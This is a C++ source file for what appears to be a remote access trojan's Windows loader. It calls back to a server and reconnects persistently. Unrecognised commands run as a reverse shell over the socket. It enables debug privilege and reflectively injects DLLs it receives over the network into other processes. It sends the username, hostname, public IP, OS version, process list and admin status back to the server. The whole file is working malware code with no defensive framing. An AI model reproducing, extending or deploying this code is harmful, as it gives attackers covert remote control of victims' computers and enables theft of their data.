#include "Loader.h"
#include "../common/Output.h"

void DLL_Loader::ExecSock(SOCKET sockfd, char recvbuf[BUFFER])
{
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)sockfd;
    if (CreateProcess(NULL, (LPSTR)recvbuf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo)) {
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
    }
    else {
        sockprintf("Failed to Create Process, Error : %ld\n", GetLastError());
    }
}


BOOL DLL_Loader::IsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PSID pAdministratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (!AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        dwError = GetLastError();

    }
    else if (!CheckTokenMembership(NULL, pAdministratorsGroup,
        &fIsRunAsAdmin)) {
        dwError = GetLastError();

    }

    if (pAdministratorsGroup) {
        FreeSid(pAdministratorsGroup);
        pAdministratorsGroup = NULL;
    }

    return fIsRunAsAdmin;
}

std::string DLL_Loader::ProcessNameAndID(DWORD processID)
{
    TCHAR szProcessName[MAX_PATH] = TEXT("[unknown]");

    // Get a handle to the process.

    std::ostringstream st;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
        PROCESS_VM_READ,
        FALSE, processID);

    // Get the process name.

    if (NULL != hProcess)
    {
        HMODULE hMod;
        DWORD cbNeeded;

        if (EnumProcessModules(hProcess, &hMod, sizeof(hMod),
            &cbNeeded))
        {
            GetModuleBaseName(hProcess, hMod, szProcessName,
                sizeof(szProcessName) / sizeof(TCHAR));
        }
    }

    // Print the process name and identifier.

    st << "P:" << szProcessName << ":" << processID;

    // Release the handle to the process.
    if (hProcess) {
        CloseHandle(hProcess);
    }
    return st.str();
}

void DLL_Loader::SendProcessList()
{
    DWORD aProcesses[BUFFER], cbNeeded, cProcesses;
    std::ostringstream s;
    unsigned int i;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        sockprintf("F_ERRError enumerating processes : %ld\n", GetLastError());
    }


    // Calculate how many process identifiers were returned.

    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the name and process identifier for each process.

    s << "<LISTPROCESS>\n";

    for (i = 0; i < cProcesses; i++)
    {
        if (aProcesses[i] != 0)
        {
            s << ProcessNameAndID(aProcesses[i]) << "\n";
        }
    }

    sockSend(s.str().c_str());
}


void DLL_Loader::sockSend(const char* data)
{
    int lerror = WSAGetLastError();
    int totalsent = 0;
    int buflen = strlen(data);
    while (buflen > totalsent) {
        int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
        if (lerror == WSAECONNRESET || lerror == SOCKET_ERROR)
        {
            connected = FALSE;
        }
        if (r < 0) return;
        totalsent += r;
    }
    return;
}

void DLL_Loader::sockprintf(const char* words, ...) {
    static char textBuffer[BUFFER];
    memset(textBuffer, '\0', BUFFER);
    va_list args;
    va_start(args, words);
    vsprintf(textBuffer, words, args);
    va_end(args);
    sockSend(textBuffer);
}

void DLL_Loader::REConnect(void)
{
    closesocket(sockfd);
    WSACleanup();
    Sleep(2000);
    ProbeConnect();
}

void DLL_Loader::ProbeConnect()
{
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        exit(1);
    }

    sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
    {
        exit(1);
    }

    std::string info = GetServerInfo();
    char* values[3];
    split((char*)info.c_str(), values, ":");
    std::string Host(values[0]);
    std::string Port(values[1]);
    int Portnum = std::stoi(Port);

    server.sin_addr.s_addr = inet_addr(Host.c_str());
    server.sin_port = htons(Portnum);
    server.sin_family = AF_INET;

    do {
        if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            REConnect();
        }
        else {
            connected = TRUE;
        }
    } while (!connected);

    LoaderMain();
}

void DLL_Loader::LoaderMain()
{

    while (connected)
    {
        Sleep(100);
        memset(recvbuf, '\0', BUFFER);
        int return_code = recv(sockfd, recvbuf, BUFFER, 0);
        if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
        {
            connected = FALSE;
        }

        if (strcmp(recvbuf, "fdll") == 0)
        {
            DWORD dwProcessId;
            BOOL reflectiveProbe = FALSE;
            memset(temp, '\0', BUFFER);
            int return_code = recv(sockfd, temp, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                break;
            }
            split(temp, fileinfo, ";;");
            int expected = atoi(fileinfo[1]);
            if (strcmp(fileinfo[2], "None") == 0) {
                dwProcessId = GetCurrentProcessId();
            }

            else if (strcmp(fileinfo[2], "REFLECTIVE_PROBE") == 0)
            {

                reflectiveProbe = TRUE;
                dwProcessId = GetCurrentProcessId();
            }
            else {
                dwProcessId = ProcessId(fileinfo[2]);
            }

            char* cpCommandLine = fileinfo[3];
            char* returnOutput = fileinfo[4]; 
            int timeInterval;
            BOOL getOut = FALSE; 
            if (strcmp(returnOutput, "TRUE") == 0)
            {
                timeInterval = atoi(fileinfo[5]);
                Prepare();
                getOut = TRUE;
            }
            unsigned char* DLL = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, expected + 1);

            memset(recvbuf, '\0', BUFFER);
            ZeroMemory(DLL, expected + 1);
            int total = 0;

            do {
                fsize = recv(sockfd, recvbuf, BUFFER, 0);
                if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                {
                    connected = FALSE;
                }
                else if (fsize == 0) {
                    break;
                }
                else {
                    memcpy(DLL + total, recvbuf, fsize);
                    total += fsize;
                }
            } while (total != expected);

            do {
                if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
                {
                    priv.PrivilegeCount = 1;
                    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                    if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
                        AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);

                    CloseHandle(hToken);
                }

                hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
                if (!hProcess)
                    BREAK_WITH_ERROR("Failed to open the target process");

                if (strcmp(cpCommandLine, "None") == 0) {
                    hModule = LoadRemoteLibraryR(hProcess, DLL, expected + 1, NULL);
                    if (!hModule)
                        BREAK_WITH_ERROR("Failed to inject the DLL");
                }
                else {
                    lpRemoteCommandLine = VirtualAllocEx(hProcess, NULL, strlen(cpCommandLine) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
                    if (!lpRemoteCommandLine)
                        BREAK_WITH_ERROR("[INJECT] inject_dll. VirtualAllocEx 1 failed");

                    if (!WriteProcessMemory(hProcess, lpRemoteCommandLine, cpCommandLine, strlen(cpCommandLine) + 1, NULL))
                        BREAK_WITH_ERROR("[INJECT] inject_dll. WriteProcessMemory 1 failed");

                    hModule = LoadRemoteLibraryR(hProcess, DLL, expected + 1, lpRemoteCommandLine);
                    if (!hModule)
                        BREAK_WITH_ERROR("Failed to inject the DLL");

                    if (reflectiveProbe)
                    {
                        connected = FALSE;
                    }
                }
                WaitForSingleObject(hModule, -1);

                if (getOut)
                {
                    const char* output = ReadReflectiveDllOutput(timeInterval).c_str();
                    sockprintf("DLL_OUTPUT%s", output);
                }
                sockprintf("DLL_OK:%ld", dwProcessId);
            } while (0);

            if (DLL)
            {
                HeapFree(GetProcessHeap(), 0, DLL);

            }
            if (hProcess)
            {
                CloseHandle(hProcess);
            }

        }

        else if (strcmp(recvbuf, "RHP_1") == 0) {
            char username[UNLEN + 1];
            char hostname[MAX_COMPUTERNAME_LENGTH + 1];
            DWORD len = UNLEN + 1;
            DWORD hlen = sizeof(hostname) / sizeof(hostname[0]);
            GetUserNameA(username, &len);
            GetComputerNameA(hostname, &hlen);
            sockprintf("%s / %s", username, hostname);
        }

        else if (strcmp(recvbuf, "RHP_2") == 0)
        {
            char* wanip[BUFFER];
            HINTERNET hInternet, hFile;
            DWORD rSize;
            if (InternetCheckConnection("http://www.google.com", 1, 0)) {
                memset(wanip, '\0', BUFFER);
                hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
                hFile = InternetOpenUrl(hInternet, "http://bot.whatismyipaddress.com/", NULL, 0, INTERNET_FLAG_RELOAD, 0);
                InternetReadFile(hFile, &wanip, sizeof(wanip), &rSize);
                wanip[rSize] = reinterpret_cast<char*>('\0');

                InternetCloseHandle(hFile);
                InternetCloseHandle(hInternet);
                sockprintf("%s", wanip);
            }
            else {
                sockprintf("No Internet Connection detected ...");
            }
        }

        else if (strcmp(recvbuf, "RHP_3") == 0)
        {
            OS();
        }

        else if (strcmp(recvbuf, "RHPTYPE") == 0)
        {
            sockprintf("%s", CLIENT_TYPE);
        }

        else if (strcmp(recvbuf, "RHPPATH") == 0)
        {
            sockprintf("%s", MyLocation().c_str());
        }

        else if (strcmp(recvbuf, "taskls") == 0)
        {
            SendProcessList();
        }

        else if (strcmp(recvbuf, "isadmin") == 0)
        {
            BOOL a = IsAdmin();
            if (a)
            {
                sockprintf("TRUE");
            }
            else {
                sockprintf("FALSE");
            }
        }

        else {
            if (strlen(recvbuf) > 0)
            {
                ExecSock(sockfd, recvbuf);
            }
        }

    }

    if (!connected)
    {
        REConnect();
    }
}


DWORD DLL_Loader::ProcessId(LPCTSTR ProcessName)
{
    PROCESSENTRY32 pt;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pt.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hsnap, &pt)) {
        do {
            if (!lstrcmpi(pt.szExeFile, ProcessName)) {
                CloseHandle(hsnap);
                return pt.th32ProcessID;
            }
        } while (Process32Next(hsnap, &pt));
    }
    CloseHandle(hsnap);
    return 0;
}

void DLL_Loader::OS(void)
{
    int ret = 0.0;
    NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW);
    OSVERSIONINFOEXW osInfo;
    *reinterpret_cast<FARPROC*>(&RtlGetVersion) = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");

    if (NULL != RtlGetVersion)
    {
        osInfo.dwOSVersionInfoSize = sizeof osInfo;
        RtlGetVersion(&osInfo);
        ret = osInfo.dwMajorVersion;
    }
    int mw = osInfo.dwMinorVersion;
    if (ret == 5) {
        switch (mw)
        {
        case 0:
            // 5.0 = Windows 2000
            sockprintf("Windows 2000");
            break;
        case 1:
            // 5.1 = Windows XP
            sockprintf("Windows 2000");
            break;

        case 2:
            sockprintf("Windows XP Professional");
            break;

        default:
            sockprintf("Windows %i", mw);
            break;
        }
    }
    else if (ret == 6) {
        switch (mw)
        {
        case 0:
            sockprintf("Windows Vista");
            break;
        case 1:
            sockprintf("Windows 7");
            break;
        case 2:
            sockprintf("Windows 8");
            break;
        case 3:
            sockprintf("Windows 8.1");
            break;

        default:
            sockprintf("Windows %i", mw);
            break;
        }
    }
    else if (ret == 10) {
        sockprintf("Windows 10");
    }
    else {

        sockprintf("Windows %i", mw);
    }
}